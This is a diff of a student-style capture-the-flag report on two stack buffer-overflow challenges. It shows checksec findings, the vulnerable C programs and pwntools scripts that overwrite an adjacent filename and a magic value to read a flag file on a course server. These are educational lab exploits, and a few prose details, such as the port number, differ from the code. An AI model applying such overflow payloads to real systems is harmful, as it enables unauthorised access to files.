@@ -1,28 +1,193 @@
-# CTF Buffer Overflow
+# CTF Buffer Overflow Report
 
-## Challenge 2
+## Preparation
 
-### Information gathering
+Before starting the CTF challenge, we took steps to set up our environment by installing two essential programs that would be used in both attacks:
 
-After reading the CTF statement in moodle we understood that the challenge would have to work harder to get the flag. Also, we had to add an exploit-example.py file to furtherly adapted. 
-The next step was to list the files in the current directory with `ls -la`:
+- **pwntools**: A Python library for interacting with binary programs.
 
-![ls](/img/ls-la-ctf52.png)
+- **checksec**: A tool used to gather information about the security measures in place for a binary program.
 
-The files above showed up and we inspected each one of them:
+## Challenge 1
 
-- `exploit-example.py`: this file is an example of an exploit, taht alows us to run the `program` that it related to `main.c` or connect directly to `ctf-fsi.fe.up.pt:4000`, which is the server that we have to connect to in order to get the flag. Then, it takes a string that will be the input of the program. This file was given to us by the professor, and we had to adapt it to our needs;
+### Information Gathering
 
-- `flag.txt`: this file holds the flag that we want to get; It was just an experimental flag to run the exploit with `DEBUG=FALSE`.
+Our initial phase involved collecting information about the target program. We ran the `checksec` command to assess the security attributes of the program and obtained the following findings:
 
-- `main.c`: In this file we can check few changes: We have the buffer with 32 bytes and the meme_file, were we want to write the flag. But now, we have a new vector that has to be filled with a specific vallue in order to open the meme_file. This value is '0xfefc2324`. 
+![checksec](img/checksec.png)
 
-- `mem.txt`: this file holds a text that will be printed running the program with a small input.
+By analysing the results we deduce that:
 
-- `program`: This is the file that we have to run in order to get the flag. It is a program that reads a string from the user and then prints it. However, it has a buffer overflow vulnerability, since it does not check the size of the input string. This means that we can write more bytes than the buffer can hold, and overwrite the meme_file in order to get the flag.
+- The file architecture is **x86 (32-bit)**.
+- There is no stack canary protecting the return address.
+- The stack has execution permissions.
+- Binary positions are not randomized.
+- The stack has read, write, and execute permissions.
+
+After that we examined the contents of the following files:
+
+- **exploit-example.py**: A template for creating an attack script. This script connects to the server **ctf-fsi.fe.up.pt:4000** and takes a string as input for the main program.
+
+  ```c
+  #!/usr/bin/python3
+  from pwn import *
+  
+  DEBUG = False
+  
+  if DEBUG:
+      r = process('./program')
+  else:
+      r = remote('ctf-fsi.fe.up.pt', 4003)
+  
+  r.recvuntil(b":")
+  r.sendline(b"Tentar nao custa")
+  r.interactive()
+  ```
+
+  
+
+- **main.c**: The C code of the program to be exploited. It initializes two character arrays: one with a size of 8, named **meme_file**, which contains the path of a file to be opened, and the other with a size of 32, named **buffer**, which is used for input. The program reads 40 bytes from the input and inserts them into the **buffer**. Finally, the program opens the file specified in **meme_file** and prints its contents.
+
+  ````c
+  #include <stdio.h>
+  #include <stdlib.h>
+  
+  int main() {
+      char meme_file[8] = "mem.txt\0";
+      char buffer[32];
+  
+      printf("Try to unlock the flag.\n");
+      printf("Show me what you got:");
+      fflush(stdout);
+      scanf("%40s", &buffer);
+  
+      printf("Echo %s\n", buffer);
+  
+      printf("I like what you got!\n");
+      
+      FILE *fd = fopen(meme_file,"r");
+      
+      while(1){
+          if(fd != NULL && fgets(buffer, 32, fd) != NULL) {
+              printf("%s", buffer);
+          } else {
+              break;
+          }
+      }
+  
+  
+      fflush(stdout);
+      
+      return 0;
+  }
+  ````
+
+- **mem.txt**: A file with some text that the program opens by default.
+
+- **program**: The compiled program from **main.c**.
 
 ### Attack
 
-After collecting and analyzing information, we identified an opportunity to exploit the administrator's use of a program with root permissions. Our method involved using a buffer overflow to carry out the attack. Here's how it was done:
+After analyzing the program's content, we identified a buffer overflow vulnerability due to the insufficiently allocated memory in the **buffer** array. To exploit this vulnerability, we modified the **exploit-example.py** script to insert 32 'a' characters followed by 'flag.txt' into the **buffer**, allowing us to override the meme_file contents with the string "flag.txt". Because of that, the program read the file "flag.txt" instead of reading the file "mem.txt". 
 
-1. 
+```c
+#!/usr/bin/python3
+from pwn import *
+
+DEBUG = False
+
+if DEBUG:
+    r = process('./program')
+else:
+    r = remote('ctf-fsi.fe.up.pt', 4003)
+
+r.recvuntil(b":")
+r.sendline(b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaflag.txt")
+r.interactive()
+```
+
+Executing this script allowed us to successfully run the program and obtain the flag.
+
+![exploit1](img/exploit1.png)
+
+## Challenge 2
+
+### Information Gathering
+
+In the second challenge, we anticipated a more complex task to retrieve the flag. Similar to the first challenge, we executed the `checksec` command, which yielded identical results regarding the program's security measures.
+
+![checksec](img/checksec.png)
+
+We proceeded to examine the contents of the following files:
+
+- **main.c**: This file, similar to the previous challenge, contains the C code of the program to be exploited. It initialises three character arrays: one with a size of 9, named **meme_file**, which holds the file path; another with a size of 4, named **val**, containing the characters "\xef\xbe\xad\xde"; and the third with a size of 32, named **buffer**, used for input. The program reads 45 bytes from the input and inserts them into the **buffer**. If the contents of **val** match **0xfefc2324**, the program opens the file specified in **meme_file** and prints its contents.
+
+  ```c
+  #include <stdio.h>
+  #include <stdlib.h>
+  
+  int main() {
+      char meme_file[9] = "mem.txt\0\0";
+      char val[4] = "\xef\xbe\xad\xde";
+      char buffer[32];
+  
+      printf("Try to unlock the flag.\n");
+      printf("Show me what you got:");
+      fflush(stdout);
+      scanf("%45s", &buffer);
+      if(*(int*)val == 0xfefc2324) {
+          printf("I like what you got!\n");
+          
+          FILE *fd = fopen(meme_file,"r");
+          
+          while(1){
+              if(fd != NULL && fgets(buffer, 32, fd) != NULL) {
+                  printf("%s", buffer);
+              } else {
+                  break;
+              }
+          }
+      } else {
+          printf("You gave me this %s and the value was %p. Disqualified!\n", meme_file, *(long*)val);
+      }
+  
+  ```
+
+  
+
+- **mem.txt**: A file containing text that the program opens by default.
+
+- **program**: The compiled program from **main.c**.
+
+### Attack
+
+Upon collecting and analysing the information, we chose a similar approach to the first challenge: exploiting the program's memory allocation and management to perform a buffer overflow attack. However, in this case, we also had to consider the contents of the **val** variable.
+
+As in the previous challenge, we created an **exploit-example.py** file to assist with the attack. This script connects to the server **ctf-fsi.fe.up.pt:4000** and takes a string as input for the main program.
+
+To achieve our objective, we leveraged the 45 bytes being inserted into the 32-byte **buffer** array to overwrite both the **val** and **meme_file** arrays with the values **0xfefc2324** and the path to the file we wanted to open, in this case, "flag.txt". To accomplish this, we modified the **exploit-example.py** script to insert 32 'a' characters followed by "\x24\x23\xfc\xfe" and, at the end, "flag.txt".
+
+We had to insert the value "\x24\x23\xfc\xfe" and not "\xfe\xfc\x23\x24" because we are working in a little-endian system. 
+
+```c
+#!/usr/bin/python3
+from pwn import *
+
+DEBUG = False
+
+if DEBUG:
+    r = process('./program')
+else:
+    r = remote('ctf-fsi.fe.up.pt', 4003)
+        
+list = [0x24,0x23,0xfc,0xfe]
+val = bytearray(list)
+        
+r.recvuntil(b":")
+r.sendline(b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+val+b"flag.txt")
+r.interactive()
+```
+
+Executing this script allowed us to successfully run the program and obtain the flag. 
+
+![exploit2](img/exploit2.png)
